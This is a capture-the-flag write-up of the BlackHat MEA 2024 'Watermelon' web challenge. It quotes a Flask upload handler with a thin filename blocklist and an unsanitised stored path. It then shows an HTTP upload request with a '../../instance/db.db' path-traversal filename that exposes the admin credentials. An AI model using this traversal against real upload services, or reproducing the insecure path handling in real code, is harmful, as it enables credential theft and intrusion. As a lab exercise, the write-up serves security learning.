---
title: "Watermelon - BlackHat MEA CTF Qualification 2024"
category: "web"
subcategory: "file-upload"
type: "writeup"
tags: ["prequalification", "web", "watermelon", "bhmea24", "file-upload", "blackhat-mea-ctf-qualification", "blackhat-mea-ctf-qualification-202", "2024", "ctf-writeup"]
summary: "Let’s launch the Docker container and start analyzing the code."
source:
  name: "CTFtime writeup #39442"
  url: "https://ctftime.org/writeup/39442"
original_source: "https://medium.com/@faleekh088/writeup-blackhat-mea-qualification-ctf-2024-watermelon-c54fa9b106cb"
ctf:
  name: "BlackHat MEA CTF Qualification 2024"
  year: 2024
  challenge: "Watermelon"
---

## Metadata

- **CTF:** BlackHat MEA CTF Qualification 2024
- **Task:** Watermelon
- **Author team:** B A N D I T S - V I I
- **CTFtime tags:** prequalification, ctf, web, watermelon, bhmea24
- **CTFtime:** <https://ctftime.org/writeup/39442>
- **Original writeup:** <https://medium.com/@faleekh088/writeup-blackhat-mea-qualification-ctf-2024-watermelon-c54fa9b106cb>

---
# Writeup BlackHat MEA Qualification CTF 2024 [Watermelon]  
![](<https://miro.medium.com/v2/resize:fit:1400/format:webp/1*66jiUj2A_sQvLWAK30JDlg.png>)

Let’s launch the Docker container and start analyzing the code. The app seems pretty basic, with just login/signup features and a file upload option. When reviewing the file upload, it’s clear that a shell upload isn’t feasible given it’s written in Python. Now, let’s dive deeper into it.  
```  
`@app.route("/upload", methods=["POST"])  
@login_required  
def upload_file():  
if 'file' not in request.files:  
return jsonify({"Error": "No file part"}), 400  
  
file = request.files['file']  
if file.filename == '':  
return jsonify({"Error": "No selected file"}), 400  
  
user_id = session.get('user_id')  
if file:  
blocked = ["proc", "self", "environ", "env"]  
filename = file.filename  
if filename in blocked:  
return jsonify({"Error":"Why?"})  
user_dir = os.path.join(app.config['UPLOAD_FOLDER'], str(user_id))  
os.makedirs(user_dir, exist_ok=True)  
  
file_path = os.path.join(user_dir, filename)  
file.save(f"{user_dir}/{secure_filename(filename)}")  
  
new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)  
db.session.add(new_file)  
db.session.commit()  
  
return jsonify({"Message": "File uploaded successfully", "file_path": file_path}), 201  
return jsonify({"Error": "File upload failed"}), 500  
`  
```  
The secure_filename function is invoked whenever a file is saved. However, there’s an issue — the filepath variable is not secured since the function isn’t applied to it. Additionally, the filepath variable gets stored in the database in the next line:  
```  
`new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)`  
```  
This is enough to do directly traversal. After register/login, upload a file with a filename to access the db.db file which contains the admin/password:  
```  
`  
POST /upload HTTP/1.1  
Host: localhost:5000  
User-Agent: curl/8.7.1  
Accept: */*  
Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6Imhhc2gifQ.ZtebRA.pzw2RU5bAOPlkusoTPCLzo747B0  
Content-Length: 234  
Content-Type: multipart/form-data; boundary=------------------------KjvLDRqPRA3nyLPTwyEEEd  
Connection: keep-alive  
\--------------------------asxnkajsxiuhiGVYVBUYd  
Content-Disposition: form-data; name="file"; filename="../../instance/db.db"  
Content-Type: application/octet-stream

`  
```  
![](<https://miro.medium.com/v2/resize:fit:720/format:webp/0*O7v0VejB_D-xurdY>)  
![](<https://miro.medium.com/v2/resize:fit:720/format:webp/0*rNncrpDPlqRgBDCi>)

Log in using the username and password, then retrieve the hash from the /admin endpoint.

![](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*30q23J5v7UTIUYFUsXIy9g.png>)
